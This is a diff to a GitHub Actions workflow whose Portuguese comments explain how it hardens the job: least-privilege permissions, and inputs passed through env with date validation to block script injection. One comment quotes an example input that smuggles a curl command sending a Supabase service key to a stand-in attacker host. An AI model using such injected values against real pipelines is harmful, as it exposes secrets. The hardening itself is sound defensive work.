@@ -62,6 +62,13 @@ concurrency:
   group: vigilia
   cancel-in-progress: true
 
+# O job lê o repositório e escreve no Supabase. Não abre PR, não comenta em
+# issue, não publica pacote — e o padrão do GitHub é conceder bem mais que isso.
+# Declarar o mínimo é o que impede um passo comprometido de fazer, com o
+# GITHUB_TOKEN, coisas que a vigília nunca precisou fazer.
+permissions:
+  contents: read
+
 jobs:
   coletar:
     runs-on: ubuntu-latest
@@ -90,6 +97,20 @@ jobs:
       - name: testar o filtro antes de coletar
         run: python -m pytest coletores -q
 
+      # **A entrada do workflow entra por `env:`, e nunca dentro do `run:`.**
+      # `${{ inputs.desde }}` é substituído TEXTUALMENTE no script antes de o
+      # shell rodar: um valor como `2025-01-01; curl -d "$SUPABASE_SERVICE_ROLE_KEY"
+      # https://atacante.example` virava um comando a mais, dentro deste passo,
+      # com todos os segredos do job à disposição.
+      #
+      # O ganho de quem exploraria isso é de PRIVILÉGIO, e é o que torna a coisa
+      # séria: segredo do Actions não é legível por colaborador, nem com permissão
+      # de escrita — a interpolação os tornava legíveis.
+      #
+      # Por `env:` o valor chega como variável de ambiente e a expansão é do
+      # shell, com aspas. E a validação abaixo é a mesma que a rota HTTP
+      # equivalente já fazia em `/api/vigilia/coletar` — data livre viraria
+      # consulta arbitrária a duas APIs públicas.
       - name: coletar
         env:
           # Sem isto o log fica MUDO até o processo terminar: o Python só
@@ -105,10 +126,31 @@ jobs:
           # web, que é frágil. Cadastro gratuito em inlabs.in.gov.br.
           INLABS_EMAIL: ${{ secrets.INLABS_EMAIL }}
           INLABS_SENHA: ${{ secrets.INLABS_SENHA }}
+          # As duas entradas do workflow_dispatch, como DADO. Nunca como texto
+          # emendado no script — ver o comentário acima deste passo.
+          DESDE: ${{ inputs.desde }}
+          SECO: ${{ inputs.seco }}
         run: |
-          python -m coletores \
-            ${{ inputs.seco && '--seco' || '' }} \
-            ${{ inputs.desde && format('--desde {0}', inputs.desde) || '' }}
+          set -euo pipefail
+
+          # A mesma regra da rota HTTP (`/api/vigilia/coletar`, o teste do
+          # formato ISO): recusar aqui, com mensagem, é melhor que passar adiante
+          # uma data que os coletores não sabem ler.
+          if [ -n "${DESDE:-}" ] && ! printf '%s' "$DESDE" | grep -Eq '^[0-9]{4}-[0-9]{2}-[0-9]{2}$'; then
+            echo "::error::'desde' precisa ser AAAA-MM-DD; recebido: $DESDE"
+            exit 1
+          fi
+
+          # `SECO` é um booleano do workflow_dispatch, e chega como o TEXTO
+          # "true" ou "false" — os dois não vazios. `${SECO:+--seco}` teria
+          # passado `--seco` também quando a caixa estava desmarcada, que é uma
+          # coleta que não grava nada e não avisa. Compara-se o valor.
+          MODO=""
+          if [ "${SECO:-}" = "true" ]; then MODO="--seco"; fi
+
+          # `${VAR:+…}` só expande quando a variável tem conteúdo, e as aspas em
+          # "$DESDE" são o que impede o valor de virar mais de um argumento.
+          python -m coletores $MODO ${DESDE:+--desde "$DESDE"}
 
       # O relatório da execução fica no log do Actions, que é o histórico de
       # coleta que ninguém precisa construir. Em falha, sobe o que deu para
